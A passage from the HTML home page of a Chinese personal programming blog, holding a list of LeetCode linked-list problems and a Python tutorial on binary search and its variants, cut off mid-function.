<!DOCTYPE html><html lang="zh-Hans"><head><!--[if IE]><style>body{display:none;}</style><script>alert('IE浏览器下无法展示效果，请更换浏览器！');var headNode=document.getElementsByTagName('head')[0];var refresh=document.createElement('meta');refresh.setAttribute('http-equiv','Refresh');refresh.setAttribute('Content','0; url=http://outdatedbrowser.com/');headNode.appendChild(refresh);</script><![endif]--><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="author" content="m01ly"><meta name="baidu-site-verification" content="yvSXOjM1ag"><meta name="google-site-verification" content="riwnp5QCq6dRKbhBa3d3aDZrfGLQVhMFN9d4fMGYuoU"><meta name="description" content="description123456"><meta property="og:type" content="website"><meta property="og:title" content="Hexo"><meta property="og:url" content="https://m01ly.github.io/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="description123456"><meta property="og:locale"><meta property="article:author" content="m01ly"><meta property="article:tag" content="description123456"><meta name="twitter:card" content="summary"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="shortcut icon" href="/favicon.ico"><link href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css" rel="stylesheet"><link rel="stylesheet" href="/css/style.css"><title>Hexo</title><script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><script src="//cdn.bootcss.com/aos/2.2.0/aos.js"></script><script>var yiliaConfig={fancybox:!0,isHome:!0,isPost:!1,isArchive:!1,isTag:!1,isCategory:!1,fancybox_js:"//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js",search:!0}</script><script>yiliaConfig.jquery_ui=[!1]</script><script>yiliaConfig.rootUrl="/"</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/rss+xml">
<link rel="stylesheet" href="/css/prism-a11y-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="container"><div class="left-col"><div class="intrude-less"><header id="header" class="inner"><a href="/" class="profilepic"><img src="/img/avatar.jpg"></a><hgroup><h1 class="header-author"><a href="/">m01ly</a></h1></hgroup><p class="header-subtitle">人生在世，全靠命</p><form id="search-form"><input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false"> <i class="fa fa-times" onclick="resetSearch()"></i></form><div id="local-search-result"></div><p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p><div id="switch-btn" class="switch-btn"><div class="icon"><div class="icon-ctn"><div class="icon-wrap icon-house" data-idx="0"><div class="birdhouse"></div><div class="birdhouse_holes"></div></div><div class="icon-wrap icon-ribbon hide" data-idx="1"><div class="ribbon"></div></div><div class="icon-wrap icon-link hide" data-idx="2"><div class="loopback_l"></div><div class="loopback_r"></div></div><div class="icon-wrap icon-me hide" data-idx="3"><div class="user"></div><div class="shoulder"></div></div></div></div><div class="tips-box hide"><div class="tips-arrow"></div><ul class="tips-inner"><li>菜单</li><li>标签</li><li>友情链接</li><li>目标</li></ul></div></div><div id="switch-area" class="switch-area"><div class="switch-wrap"><section class="switch-part switch-part1"><nav class="header-menu"><ul><li><a href="/">主页</a></li><li><a href="/archives/">所有文章</a></li><li><a href="/tags/">标签云</a></li><li><a href="/about/">简历</a></li></ul></nav><nav class="header-nav"><ul class="social"><a class="fa GitHub" target="_blank" rel="noopener" href="https://github.com/m01ly" title="GitHub"></a> <a class="fa RSS" href="/atom.xml" title="RSS"></a> <a class="fa 网易云音乐" target="_blank" rel="noopener" href="https://music.163.com/" title="网易云音乐"></a></ul><ul class="social"><div class="donateIcon-position"><p style="display:block"><a class="donateIcon" href="javascript:void(0)" onmouseout='var qr=document.getElementById("donate");qr.style.display="none"' onmouseenter='var qr=document.getElementById("donate");qr.style.display="block"'>赏</a></p><div id="donate"><img id="multipay" src="/img/multipay.png" width="250px" alt="m01ly Multipay"><div class="triangle"></div></div></div></ul></nav></section><section class="switch-part switch-part2"><div class="widget tagcloud" id="js-tagcloud"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/TLS/" rel="tag">TLS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcpde/" rel="tag">leetcpde</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" rel="tag">企业安全建设</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" rel="tag">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%B9%E5%99%A8%E6%95%99%E7%A8%8B/" rel="tag">容器教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" rel="tag">插件开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/" rel="tag">日志管理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" rel="tag">机器学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" rel="tag">移动安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BAwriteup/" rel="tag">靶场writeup</a></li></ul></div></section><section class="switch-part switch-part3"><div id="js-friends"><a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/TechCatsLab">TechCatsLab</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://yangchenglong11.github.io">YangChengLong</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://jsharkc.github.io">LiuJiaChang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://blog.yusank.space">YusanKurban</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://blog.lizebang.top">Lizebang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/sunanxiang">SunAnXiang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/DoubleWoodH">LinHao</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://blog.littlechao.top">ShiChao</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/Txiaozhe">TangXiaoJi</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/LLLeon">JiaChenHui</a></div></section><section class="switch-part switch-part4"><div id="js-aboutme">不悲不喜，不卑不亢，努力成为一个更好的程序猿！</div></section></div></div></header></div></div><div class="hide-left-col" title="隐藏侧栏"><i class="fa fa-angle-double-left"></i></div><div class="mid-col"><nav id="mobile-nav"><div class="overlay"><div class="slider-trigger"></div><h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">m01ly</a></h1></div><div class="intrude-less"><header id="header" class="inner"><a href="/" class="profilepic"><img src="/img/avatar.jpg"></a><hgroup><h1 class="header-author"><a href="/" title="回到主页">m01ly</a></h1></hgroup><p class="header-subtitle">人生在世，全靠命</p><nav class="header-menu"><ul><li><a href="/">主页</a></li><li><a href="/archives/">所有文章</a></li><li><a href="/tags/">标签云</a></li><li><a href="/about/">简历</a></li><div class="clearfix"></div></ul></nav><nav class="header-nav"><ul class="social"><a class="fa GitHub" target="_blank" href="https://github.com/m01ly" title="GitHub"></a> <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a> <a class="fa 网易云音乐" target="_blank" href="https://music.163.com/" title="网易云音乐"></a></ul></nav></header></div><link class="menu-list" tags="标签" friends="友情链接" about="目标"></nav><div class="body-wrap"><article id="post-leetcode-list" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/06/28/leetcode-list/" class="article-date"><time class="published" datetime="2021-06-28T03:27:49.000Z" itemprop="datePublished">2021-06-28 发布</time> <time class="updated" datetime="2021-06-28T03:28:17.295Z" itemprop="dateUpdated">2021-06-28 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/06/28/leetcode-list/">链表相关</a></h1></header><div class="article-entry" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><table><thead><tr><th align="left">题号</th><th align="left">题目</th><th>难度</th></tr></thead><tbody><tr><td align="left">leetcode 21</td><td align="left">合并两个有序链表</td><td>简单</td></tr><tr><td align="left">leetcode 203</td><td align="left">移除链表元素</td><td></td></tr><tr><td align="left">leetcode 206</td><td align="left">反转链表</td><td></td></tr><tr><td align="left">leetcode 141</td><td align="left">环形链表</td><td></td></tr><tr><td align="left">leetcode 86</td><td align="left">分隔链表</td><td></td></tr><tr><td align="left">leetcode 61</td><td align="left">旋转链表</td><td></td></tr><tr><td align="left">剑指 Offer 22</td><td align="left">链表中倒数第k个节点</td><td></td></tr><tr><td align="left">剑指 Offer 52：</td><td align="left">两个链表的第一个公共节点</td><td></td></tr></tbody></table><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数82</span> <span class="post-count">预计阅读1分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-leetcode-binary" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/05/26/leetcode-binary/" class="article-date"><time class="published" datetime="2021-05-26T02:11:11.000Z" itemprop="datePublished">2021-05-26 发布</time> <time class="updated" datetime="2021-06-25T02:41:26.910Z" itemprop="dateUpdated">2021-06-25 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/05/26/leetcode-binary/">二分查找相关的题目</a></h1></header><div class="article-entry" itemprop="articleBody"><p>二分查找也称折半查找（Binary Search），是一种在有序数组中查找某一特定元素的搜索算法。我们可以从定义可知，运用二分搜索的前提是数组必须是有序的，这里需要注意的是，我们的输入不一定是数组，也可以是数组中某一区间的起始位置和终止位置</p><h2 id="0-经典二分法"><a href="#0-经典二分法" class="headerlink" title="0 经典二分法"></a>0 经典二分法</h2><p><strong>中间位置的计算：</strong></p><p>mid=left+(right-left)//2或者使用位运算mid=left + ((right - left) &gt;&gt; 1)，注意不能使用 （left + right ）/ 2,否则有可能会导致溢出。</p><p><strong>计算思路：</strong></p><p>二分查找的执行过程如下</p><p>1.从已经排好序的数组或区间中，取出中间位置的元素，将其与我们的目标值进行比较，判断是否相等，如果相等</p><p>则返回。</p><p>2.如果 nums[mid] 和 target 不相等，则对 nums[mid] 和 target 值进行比较大小，通过比较结果决定是从 mid</p><p>的左半部分还是右半部分继续搜索。如果 target &gt; nums[mid] 则右半区间继续进行搜索，即 left = mid + 1; 若</p><p>target &lt; nums[mid] 则在左半区间继续进行搜索，即 right = mid -1；</p><p><strong>注意事项：</strong></p><p>1.while (left &lt; = right) { } 注意括号内为 left &lt;= right ,而不是 left &lt; right ，如果我们设置条件为 left &lt; right 则当我们执行到最后一步时，则我们的 left 和 right 重叠时，则会跳出循环，返回 -1，区间内不存在该元素，但是不是这样的，我们的 left 和 right 此时指向的就是我们的目标元素 ，但是此时 left = right 跳出循环</p><p><strong>代码：</strong></p><p><strong>（1）非递归写法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>  mid
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            right<span class="token operator">=</span>mid<span class="token number">-1</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span>
    res<span class="token operator">=</span>binarySearch<span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>(2)递归写法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyRecursion</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>
        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>  mid
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> binarySearchbyRecursion<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要记得Return 不然最后都是执行return -1，返回-1</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> binarySearchbyRecursion<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>mid<span class="token number">-1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要记得Return 不然最后都是执行return -1，返回-1 </span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="变形1-无重复-有序"><a href="#变形1-无重复-有序" class="headerlink" title="变形1 无重复 有序"></a>变形1 无重复 有序</h2><h3 id="1-1-LTD35-搜索插入位置"><a href="#1-1-LTD35-搜索插入位置" class="headerlink" title="1.1 LTD35 搜索插入位置"></a>1.1 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/search-insert-position/">LTD35 搜索插入位置</a></h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h4><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>你可以假设数组中无重复元素。</p><p>示例 1:</p><p>输入: [1,3,5,6], 5<br>输出: 2</p><p>示例 2:</p><p>输入: [1,3,5,6], 2<br>输出: 1</p><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h4><p>这个题目完全就和咱们的二分查找一样，只不过有了一点改写，那就是将咱们的返回值改成了 left或者mid+1，具体实现过程见下图</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>
        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>  mid
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            right<span class="token operator">=</span>mid<span class="token number">-1</span>
    <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#或者为mid+1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-剑指-Offer-53-II-0～n-1中缺失的数字"><a href="#1-2-剑指-Offer-53-II-0～n-1中缺失的数字" class="headerlink" title="1.2  剑指 Offer 53 - II. 0～n-1中缺失的数字"></a>1.2 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">剑指 Offer 53 - II. 0～n-1中缺失的数字</a></h3><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。</p><p><strong>示例 1:</strong></p><pre><code>输入: [0,1,3]
输出: 2</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: [0]
输出: 1</code></pre><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h4><p>与leetcode35搜索插入位置有点子像，这里把Target想象成mid</p><p>在数组中找到mid！=nums[mid]，并返回mid插入数组中的位置。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">missingNumber</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        :type nums: List[int]
        :rtype: int
        """</span>
        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">!=</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
                right<span class="token operator">=</span>mid<span class="token number">-1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">return</span> left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-LTD69-x-的平方根"><a href="#1-3-LTD69-x-的平方根" class="headerlink" title="1.3 LTD69. x 的平方根"></a>1.3 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/sqrtx/">LTD69. x 的平方根</a></h3><h4 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h4><p>实现 <code>int sqrt(int x)</code> 函数:计算并返回 <em>x</em> 的平方根，其中 <em>x</em> 是非负整数。由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。</p><p><strong>示例 1:</strong></p><pre><code>输入: 4
输出: 2</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: 8
输出: 2
说明: 8 的平方根是 2.82842..., 
     由于返回类型是整数，小数部分将被舍去。</code></pre><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>用二分法判断，初始区间为[0,x]，然后不断的找最大的mid使得mid*mid&lt;=即可，即ans=mid。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre><code>class Solution(object):
    def mySqrt(self, x):
        &quot;&quot;&quot;
        :type x: int
        :rtype: int
        &quot;&quot;&quot;
        left,right,ans=0,x,-1
        while left&lt;=right:
            mid=left+(right-left)//2
            if mid*mid&lt;=x:
                ans=mid
                left=mid+1
            else:
                right=mid-1
        return ans</code></pre><h3 id="1-4-LTD50-Pow-x-n"><a href="#1-4-LTD50-Pow-x-n" class="headerlink" title="1.4 LTD50. Pow(x, n)"></a>1.4 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/powx-n/">LTD50. Pow(x, n)</a></h3><p>题目描述</p><p>实现 <a target="_blank" rel="noopener" href="https://www.cplusplus.com/reference/valarray/pow/">pow(<em>x</em>, <em>n</em>)</a> ，即计算 x 的 n 次幂函数（即，xn）。</p><p><strong>示例 1：</strong></p><pre><code>输入：x = 2.00000, n = 10
输出：1024.00000</code></pre><p>More:</p><p><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/first-bad-version/">第一个错误的版本</a></p><p><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/guess-number-higher-or-lower/">猜数字大小</a></p><h2 id="变形2-有序数组-但是有重复值"><a href="#变形2-有序数组-但是有重复值" class="headerlink" title="变形2 有序数组 但是有重复值"></a>变形2 有序数组 但是有重复值</h2><h3 id="2-1-LTD-34在排序数组中查找元素的第一个和最后一个位置"><a href="#2-1-LTD-34在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="2.1  LTD 34在排序数组中查找元素的第一个和最后一个位置"></a>2.1 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">LTD 34在排序数组中查找元素的第一个和最后一个位置</a></h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h4><p>给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。</p><p>如果数组中不存在目标值 target，返回 [-1, -1]。</p><p>示例 1：</p><p>输入：nums = [5,7,7,8,8,10], target = 8<br>输出：[3,4]</p><p>示例 2：</p><p>输入：nums = [], target = 0<br>输出：[-1,-1]</p><h4 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a><strong>思路1：</strong></h4><p>我们只需在这段代码中修改即可，nums[mid] == target 时则返回，nums[mid] &lt; target 时则移动左指针，在右区间进行查找， nums[mid] &gt; target时则移动右指针，在左区间内进行查找。</p><p>计算下边界时，当 target &lt;= nums[mid] 时，right = mid -1；target &gt; nums[mid] 时，left = mid + 1；</p><p>计算上边界时，当 target &lt; nums[mid] 时，right = mid -1; target &gt;= nums[mid] 时 left = mid + 1;刚好和计算下边界时条件相反，返回right。</p><h4 id="代码："><a href="#代码：" class="headerlink" title="代码："></a><strong>代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyLt32</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    upper<span class="token operator">=</span>upperBound<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span>
    lower<span class="token operator">=</span>lowerBound<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>lower<span class="token operator">></span>upper<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不存在的情况</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>lower<span class="token punctuation">,</span>upper<span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#计算下边界</span>
<span class="token keyword">def</span> <span class="token function">lowerBound</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>
        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往左边，移动右指针往左</span>
            right<span class="token operator">=</span>mid<span class="token number">-1</span>
    <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#返回left</span>
<span class="token comment" spellcheck="true">#计算上边界</span>
<span class="token keyword">def</span> <span class="token function">upperBound</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>
        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>
